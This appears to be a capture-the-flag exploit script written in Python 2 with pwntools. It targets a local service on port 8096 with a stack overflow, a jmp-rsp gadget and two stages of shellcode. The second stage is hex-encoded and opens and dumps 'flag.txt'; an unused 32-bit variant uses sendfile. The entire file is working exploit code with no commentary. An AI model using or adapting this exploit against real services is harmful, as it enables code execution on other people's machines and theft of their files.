from pwn import *
import time

p = remote('localhost',8096)


jmprsp = 0x000000000040185d

shellcode = '''
xor rax, rax
mov rdi, rax
mov edi, 0x4040c4
mov rdi, [rdi]
mov rdx, rax
mov rsi, rsp
sub rsi, 0x20
mov dl, 200
syscall
add rsi, 8
call rsi
'''
shellcode = asm(shellcode, arch='amd64')
print len(shellcode)
shellcode1 = '\xeb\xd2'


shell = """
    xor rax, rax
    mov rdi, rax
    mov edi, 0x4040c4
    mov rdi, [rdi]
    mov rdx, rax
    mov rsi, 0x4040d0
    mov dl, 200
    syscall

"""
shell32 = '''
    xor eax, eax
    mov ebx, 0x4040d0
    mov ecx, eax
    mov cl, 4
    mov edx, eax 
    mov al, 5
    int 0x80

    mov ecx, eax
    mov ax, 187
    pop ebx
    xor edx, edx
    xor esi, esi
    mov si, 100
    int 0x80

    xor eax, eax
    inc eax
    int 0x80
'''

shell = 'e809000000666c61672e747874005f4831f6b8020000400f054889c74883ec40488d3424ba40000000b8000000400f05bf010000004889c2b8010000400f05b83c0000404831ff0f05'.decode('hex')
shell32 = asm(shell32,arch='i386')


print shellcode.encode('hex')
p.sendline('done'+'\x90'*(36-len(shellcode))+shellcode+ p64(jmprsp) + shellcode1)
time.sleep(.1)



p.sendline('\x90'*30+ shell)




p.interactive()
